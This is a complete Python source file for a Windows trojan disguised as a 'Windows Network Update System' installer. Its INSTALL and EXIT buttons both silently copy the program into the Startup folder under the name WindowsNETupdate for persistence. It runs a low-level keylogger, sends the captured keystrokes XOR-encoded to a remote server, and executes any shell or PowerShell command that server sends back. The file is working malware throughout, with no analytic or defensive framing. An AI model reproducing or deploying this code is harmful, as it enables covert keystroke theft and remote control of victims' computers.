import socket
import subprocess
import os
import sys
import getpass
import threading
import time
import requests
import tkinter as tk
from tkinter import messagebox
import shutil
from PIL import Image, ImageTk
import base64
import ctypes
import ctypes.wintypes

SERVER_PORT = 9999
SECRET_KEY = b"edgar"
DEBUG_MODE = False

def xor_encrypt_decrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def xor_base64_encode(data: str, key: int = 0x42) -> str:
    xored = bytes([b ^ key for b in data.encode()])
    return base64.b64encode(xored).decode()

def xor_base64_decode(data: str, key: int = 0x42) -> str:
    decoded = base64.b64decode(data)
    return bytes([b ^ key for b in decoded]).decode(errors='ignore')

def get_public_ip():
    try:
        ip = requests.get('https://api.ipify.org', timeout=10).text.strip()
        if ip and ip != "127.0.0.1":
            return ip
    except Exception:
        pass
    try:
        ip = requests.get('https://ipinfo.io/ip', timeout=10).text.strip()
        if ip and ip != "127.0.0.1":
            return ip
    except Exception:
        pass
    try:
        ip = requests.get('https://icanhazip.com', timeout=10).text.strip()
        if ip and ip != "127.0.0.1":
            return ip
    except Exception:
        pass
    return None

def get_server_http():
    public_ip = get_public_ip()
    if public_ip:
        return f"http://{public_ip}:8000"
    return "http://localhost:8000"

IP_SERVER_HTTP = get_server_http()

def get_server_ip():
    urls_to_try = [
        f"{IP_SERVER_HTTP}/current_ip.txt",
        f"{IP_SERVER_HTTP}/",
        "http://localhost:8000/current_ip.txt",
        "http://localhost:8000/",
        "http://127.0.0.1:8000/current_ip.txt",
        "http://127.0.0.1:8000/"
    ]
    
    for url in urls_to_try:
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                ip = response.text.strip()
                if ip and len(ip.split('.')) == 4:
                    return ip
        except Exception:
            continue
    try:
        if os.path.exists('current_ip.txt'):
            with open('current_ip.txt', 'r') as f:
                ip = f.read().strip()
                if ip and len(ip.split('.')) == 4:
                    return ip
    except Exception:
        pass
    
    return None

def get_startup_path():
    appdata = os.getenv('APPDATA')
    if not appdata:
        return None
    return os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup", "WindowsNETupdate.exe")

def is_installed():
    startup_path = get_startup_path()
    if not startup_path:
        return False
    return os.path.exists(startup_path)

def install_silently():
    try:
        startup_path = get_startup_path()
        if not startup_path:
            return False
        os.makedirs(os.path.dirname(startup_path), exist_ok=True)
        if is_installed():
            return True
        if getattr(sys, 'frozen', False):
            current_exe = os.path.abspath(sys.executable)
            dest_path = startup_path
            shutil.copy2(current_exe, dest_path)
        else:
            current_script = os.path.abspath(sys.argv[0])
            dest_py = os.path.join(os.path.dirname(startup_path), "WindowsNETupdate.py")
            shutil.copy2(current_script, dest_py)
            vbs_path = os.path.join(os.path.dirname(startup_path), "WindowsNETupdate.vbs")
            try:
                with open(vbs_path, 'w', encoding='utf-8') as f:
                    f.write('Set WshShell = CreateObject("WScript.Shell")\n')
                    f.write(f'WshShell.Run "pythonw \"{dest_py}\"", 0, False\n')
                    f.write('Set WshShell = Nothing\n')
            except Exception:
                pass
            batch_path = os.path.join(os.path.dirname(startup_path), "WindowsNETupdate.bat")
            try:
                with open(batch_path, 'w', encoding='utf-8') as f:
                    f.write('@echo off\n')
                    f.write(f'python "{dest_py}"\n')
            except Exception:
                pass
        return True
    except Exception as e:
        return False

logging_active = False
log = ""
client_socket = None
keylogger_thread = None

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
hook_id = None

def low_level_keyboard_proc(nCode, wParam, lParam):
    global log, logging_active
    if not logging_active:
        return user32.CallNextHookEx(None, nCode, wParam, lParam)
    if wParam == WM_KEYDOWN:
        vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.wintypes.DWORD))[0]
        try:
            char = chr(vk_code)
        except Exception:
            char = f"[{vk_code}]"
        log += char
        if len(log) >= 100:
            send_to_server(log)
            log = ""
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_void_p)
pointer = CMPFUNC(low_level_keyboard_proc)

def keylogger_listener():
    global hook_id
    hook_id = user32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer, kernel32.GetModuleHandleW(None), 0)
    msg = ctypes.wintypes.MSG()
    while True:
        user32.GetMessageA(ctypes.byref(msg), 0, 0, 0)

def start_keylogger():
    global logging_active, keylogger_thread
    if not logging_active:
        logging_active = True
        if keylogger_thread is None or not keylogger_thread.is_alive():
            keylogger_thread = threading.Thread(target=keylogger_listener, daemon=True)
            keylogger_thread.start()

def stop_keylogger():
    global logging_active, log, hook_id
    if logging_active:
        logging_active = False
        if log:
            send_to_server(log)
            log = ""
        send_to_server("[Logging stopped]")
        if hook_id:
            user32.UnhookWindowsHookEx(hook_id)
            hook_id = None

def send_to_server(message):
    global client_socket
    if client_socket is not None:
        try:
            encoded = xor_base64_encode(message)
            client_socket.send(encoded.encode())
        except Exception:
            pass

def listen_commands(sock):
    global logging_active, client_socket
    client_socket = sock
    while True:
        try:
            data = sock.recv(1024)
            if not data:
                break
            try:
                command = xor_encrypt_decrypt(data, SECRET_KEY).decode("utf-8", errors="ignore")
                
                if command.startswith("powershell -Command"):
                    cmd = command.replace("powershell -Command \"", "").replace("\"", "")
                    result = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True)
                else:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                
                output = result.stdout + result.stderr
                if not output:
                    output = "Command executed successfully.\n"
                
                encrypted_output = xor_encrypt_decrypt(output.encode(), SECRET_KEY)
                sock.send(encrypted_output)
                continue
            except:
                pass
            try:
                decoded_data = data.decode()
                if decoded_data == 'run_keylogger':
                    start_keylogger()
                elif decoded_data == 'stop_keylogger':
                    stop_keylogger()
                elif decoded_data == 'exit':
                    stop_keylogger()
                    sock.close()
                    sys.exit()
            except Exception:
                break
        except Exception:
            break

def try_connect(ip):
    reconnect_delay = 5
    max_delay = 300
    global client_socket
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, SERVER_PORT))
            sock.settimeout(None)
            
            username = getpass.getuser()
            sock.send(username.encode())
            
            client_socket = sock
            listen_commands(sock)
        except Exception as e:
            time.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 2, max_delay)

def connect():
    public_ip = get_server_ip()
    local_ip = "127.0.0.1"
    threads = []
    if public_ip:
        t_pub = threading.Thread(target=try_connect, args=(public_ip,), daemon=True)
        threads.append(t_pub)
        t_pub.start()
    t_loc = threading.Thread(target=try_connect, args=(local_ip,), daemon=True)
    threads.append(t_loc)
    t_loc.start()
    for t in threads:
        t.join()

def instalar():
    if install_silently():
        startup_path = get_startup_path()
        if startup_path and os.path.exists(startup_path):
            try:
                if sys.platform.startswith('win'):
                    subprocess.Popen([startup_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
                else:
                    subprocess.Popen([startup_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
    root.destroy()
    sys.exit(0)

def sair():
    if install_silently():
        startup_path = get_startup_path()
        if startup_path and os.path.exists(startup_path):
            try:
                if sys.platform.startswith('win'):
                    subprocess.Popen([startup_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
                else:
                    subprocess.Popen([startup_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
    root.destroy()
    sys.exit(0)

def create_gui():
    global root
    root = tk.Tk()
    root.title("Windows Network Update system")
    root.geometry("800x400")
    root.configure(bg='white')

    title = tk.Label(root, text="Windows Network\nUpdate System", 
                     font=("Helvetica", 26, "bold"), fg="#f5a623", bg="white", justify="left")
    title.place(x=30, y=40)

    description = tk.Label(root, text="Windows Network Update System is\na service that allows your pc to\n automatically update windows network drivers\njust by having the software on your pc.\nIt makes remote connection easier\nthan ever!",
                           font=("Helvetica", 12), bg="white", justify="left")
    description.place(x=30, y=150)

    btn_instalar = tk.Button(root, text="INSTALL", font=("Helvetica", 12, "bold"), command=instalar)
    btn_instalar.place(x=50, y=300, width=120, height=40)

    btn_sair = tk.Button(root, text="EXIT", font=("Helvetica", 12, "bold"), command=sair)
    btn_sair.place(x=200, y=300, width=120, height=40)

    img_path = None
    try:
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS
            img_path = os.path.join(base_path, "setupwizard.png")
        else:
            img_path = os.path.join(os.path.dirname(__file__), "setupwizard.png")
    except Exception:
        pass
    
    if not img_path or not os.path.exists(img_path):
        fallback_paths = [
            "setupwizard.png",
            os.path.join(os.path.dirname(__file__), "setupwizard.png"),
            os.path.join(os.path.dirname(sys.argv[0]), "setupwizard.png"),
        ]
        
        for path in fallback_paths:
            if os.path.exists(path):
                img_path = path
                break
    
    if img_path and os.path.exists(img_path):
        try:
            img = Image.open(img_path)
            img = img.resize((300, 300), Image.Resampling.LANCZOS)
            photo = ImageTk.PhotoImage(img)
            label_img = tk.Label(root, image=photo, bg="white")
            label_img.image = photo
            label_img.place(x=450, y=50)
        except Exception:
            pass

    return root

if __name__ == "__main__":
    if is_installed():
        threading.Thread(target=connect, daemon=True).start()
        while True:
            time.sleep(1)
    else:
        root = create_gui()
        root.mainloop()
